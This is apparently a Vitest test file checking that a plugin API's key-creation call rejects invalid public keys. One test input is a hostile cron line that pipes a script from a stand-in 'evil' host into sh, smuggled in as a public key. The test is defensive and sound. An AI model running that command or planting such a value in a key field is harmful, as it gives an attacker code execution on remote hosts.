import { describe, it, expect, beforeEach, vi } from "vitest";
import { createHostPluginAPI } from "./runtime";
import { saveKey } from "@/services/keys";
import { storeSecret } from "@/services/vault";

vi.mock("@/services/keys", () => ({
  listKeys: vi.fn(async () => []),
  saveKey: vi.fn(async () => ({ id: "k1", name: "k", key_type: "ed25519", tags: [] })),
  deleteKey: vi.fn(async () => {}),
}));
vi.mock("@/services/vault", () => ({
  getSecret: vi.fn(async () => null),
  storeSecret: vi.fn(async () => {}),
  deleteSecret: vi.fn(async () => {}),
  getPluginSecret: vi.fn(async () => null),
  storePluginSecret: vi.fn(async () => {}),
  deletePluginSecret: vi.fn(async () => {}),
}));

const PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqW1p3nMuFvR5NHqhkxLQKfDVZ2VYFOxKvL8dW7dSpq user@host";

beforeEach(() => vi.clearAllMocks());

describe("api.keys.create public-key validation", () => {
  it("refuses a payload public key, storing neither the key nor the secret", async () => {
    // addToHost writes this half into a remote file verbatim; stored unvalidated
    // it is a cron entry or a shell rc line waiting for a deploy.
    const api = createHostPluginAPI("test:keycreate-bad", ["keys:write"]);
    await expect(api.keys.create({}, "PRIVATE", "* * * * * root curl http://evil/x|sh"))
      .rejects.toThrow(/public key/i);
    expect(saveKey).not.toHaveBeenCalled();
    expect(storeSecret).not.toHaveBeenCalled();
  });

  it("stores a real public key", async () => {
    const api = createHostPluginAPI("test:keycreate-good", ["keys:write"]);
    await expect(api.keys.create({}, "PRIVATE", PUB_KEY)).resolves.toMatchObject({ id: "k1" });
    expect(storeSecret).toHaveBeenCalledWith("key:k1:public", PUB_KEY);
  });

  it("still allows a key saved with no public half", async () => {
    const api = createHostPluginAPI("test:keycreate-none", ["keys:write"]);
    await expect(api.keys.create({}, "PRIVATE")).resolves.toMatchObject({ id: "k1" });
    expect(storeSecret).toHaveBeenCalledTimes(1);
  });
});
